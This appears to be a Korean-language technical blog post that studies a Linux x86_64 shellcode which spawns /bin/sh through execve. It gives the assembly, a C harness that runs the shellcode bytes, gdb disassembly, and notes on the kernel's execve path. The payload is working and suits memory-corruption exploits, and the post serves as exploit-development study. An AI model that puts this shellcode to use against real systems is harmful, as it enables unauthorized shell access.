---
layout: post
title: "Linux x86_64 shellcode"
date: 2014-11-08 15:49:47 +0900
comments: true
categories: 
---

[Linux x86_64 shellcode](http://www.exploit-db.com/exploits/13691)

    section .text
        global _start
    _start:
        xor rdx,rdx
        mov qword rbx, '//bin/sh'
        shr rbx,0x8
        push rbx
        mov rdi,rsp
        xor rax,rax
        push rax
        push rdi
        mov rsi,rsp
        mov al,0x3b
        syscall

    int main(void)
    {
        //void (*p)();
        char *shellcode = ""
            "\x48\x31\xd2"
            "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
            "\x48\xc1\xeb\x08"
            "\x53"
            "\x48\x89\xe7"  /* mov rdi,rsp */
            "\x48\x31\xc0"  /* xor rax,rax */
            "\x50"          /* push rax */
            "\x57"
            "\x48\x89\xe6"
            "\xb0\x3b"
            "\x0f\x05" ;

        //p = (void(*)()) shellcode;
        //(*p)();
        (*(void(*)())shellcode)()
    }

    $ gcc -g a.c
    $ gdb a.out
    (gdb) break 18
    Breakpoint 1 at 0x4004c4: file a.c, line 18.
    (gdb) run
    Starting program: /home/z/shell/a.out
    warning: no loadable section found in added symbol-file system-supplied DSO at 0x7ffff7ffa000

    Breakpoint 1, main() at a.c:18
    18          (*(void(*)())shellcode)();
    (gdb) disassemble
    Dump of assembler code for function main:
       0x00000000004004b4 <+0>:     push   %rbp
       0x00000000004004b5 <+1>:     mov    %rsp,%rbp
       0x00000000004004b8 <+4>:     sub    $0x10,%rsp
       0x00000000004004bc <+8>:     movq   $0x4005d0,-0x8(%rbp)
    => 0x00000000004004c4 <+16>:    mov    -0x8(%rbp),%rdx
       0x00000000004004c8 <+20>:    mov    $0x0,%eax
       0x00000000004004cd <+25>:    callq  *%rdx
       0x00000000004004cf <+27>:    leaveq
       0x00000000004004d0 <+28>:    retq
    End of assembler dump.
    (gdb) x $rbp-0x8
    0x7fffffffe038: 0x004005d0

0x004005d0 부터 shellcode 가 들어있는 것을 확인

`movabs $0x68732f6e69622f2f,%rbx` 로 `//bin/sh` 을 `%rbx` 에 집어넣고, 
, 오른쪽으로 8 bit shift 해서,
`/bin/sh\x00` 을 만든다.

그리고, 이를 push 해서, 메모리에 

    00 NULL  <-- High
    68 'h'
    73 's'
    2f '/'
    6e 'n'
    69 'i'
    62 'b'
    2f '/'   <-- Low (%rsp)

를 만든다.

[Searchable Linux Syscall Table for x86 and x86_64](https://filippo.io/linux-syscall-table) 에서 64-bit 를 참조.

    Instruction: `syscall`
    Return value found in: `%rax`
    rax: system call number
    rdi: name 
    rsi: argv 
    rdx: envp
    
`0x3b` 는 execve 로 `linux/fs/exec.c` 에 구현되어있다. `syscall` 인터페이스는 `arch/x86_64/kernel/entry.S` 를 보면 된다.

    /*
     * execve(). This function needs to use IRET, not SYSRET, to set up all state properly.
     *
     * C extern interface:
     *       extern long execve(char *name, char **argv, char **envp)
     *
     * asm input arguments:
     *      rdi: name, rsi: argv, rdx: envp
     *
     * We want to fallback into:
     *      extern long sys_execve(char *name, char **argv, char **envp, struct pt_regs regs)
     *
     * do_sys_execve asm fallback arguments:
     *      rdi: name, rsi: argv, rdx: envp, fake frame on the stack
     */
    ENTRY(execve)
            FAKE_STACK_FRAME $0
            SAVE_ALL
            call sys_execve
            movq %rax, RAX(%rsp)
            RESTORE_REST
            testq %rax,%rax
            je int_ret_from_sys_call
            RESTORE_ARGS
            UNFAKE_STACK_FRAME
            ret

`arch/x86/kernel/process_64.c` 에 sys_execve() 가 있고, 이게 

    /*
     * sys_execve() executes a new program.
     */
    asmlinkage
    long sys_execve(const char __user *name, const char __user *const __user *argv, const char __user *const __user *envp)

`/fs/exec.c` 에 있는 `do_execve()` 를 호출한다. [fs/exec.c](http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/fs/exec.c)

    /*
     * linux/fs/exec.c
     */
    ...
    int do_execve(struct filename *filename,
            const char __user *const __user *__argv,
            const char __user *const __user *__envp)
    {
        struct user_arg_ptr argv = { .ptr.native = __argv };
        struct user_arg_ptr envp = { .ptr.native = __envp };
        return do_execve_common(filename, argv, envp);
    }

이제 다시 shellcode 를 disassemble 해본다.

    Instruction: `syscall`
    Return value found in: `%rax`
    rax: system call number
    rdi: name 
    rsi: argv 
    rdx: envp


`%rdx` 를 0 으로 만들었다.
    
    => 0x00000000004005d0:  xor    %rdx,%rdx


이 세 인스트럭션으로 메모리에 `/bin/sh\x00` 을 깔았다.

       0x00000000004005d3:  movabs $0x68732f6e69622f2f,%rbx
       0x00000000004005dd:  shr    $0x8,%rbx
       0x00000000004005e1:  push   %rbx

이제 이 메모리 주소를 `%rdi` 에 셋업한다. `name` 이 된다. `do_execve(name,...)`

       0x00000000004005e2:  mov    %rsp,%rdi

이제 `%rsi` 에 argv 를 셋업한다. 이해가 안가는 곳은 `push %rax` 이다. 항상 0 이 될 수 있을까? 이걸 수정해서 새버전을 만들었다. `xor %rax,%rax` 를 `push %rax` 전에 넣으면 된다.

       0x00000000004005e5:  push   %rax  ; argv[1] : NULL pointer
       0x00000000004005e6:  push   %rdi  ; argv[0] : pointer to '/bin/sh\0'
       0x00000000004005e7:  mov    %rsp,%rsi ; %rsi points argv[0]
    
이제 `%rdx (envp)` 는 NULL, `%rsi` 는 argv[0], `%rdi` 는 filename 이 셋업되었다.

`%ax` 에 `execve` 를 넣고 syscall 을 수행한다.

    (gdb) x 0x004005d0
    0x4005d0:       0x48d23148
    (gdb) stepi
    ...
    (gdb) stepi
    (gdb) disassemble $rdx,+30
    Dump of assembler code from 0x4005d0 to 0x4005ee:
    => 0x00000000004005d0:  xor    %rdx,%rdx
       0x00000000004005d3:  movabs $0x68732f6e69622f2f,%rbx
       0x00000000004005dd:  shr    $0x8,%rbx
       0x00000000004005e1:  push   %rbx
       0x00000000004005e2:  mov    %rsp,%rdi
       0x00000000004005e5:  push   %rax
       0x00000000004005e6:  push   %rdi
       0x00000000004005e7:  mov    %rsp,%rsi
       0x00000000004005ea:  mov    $0x3b,%al
       0x00000000004005ec:  syscall
    End of assembler dump.
    (gdb)
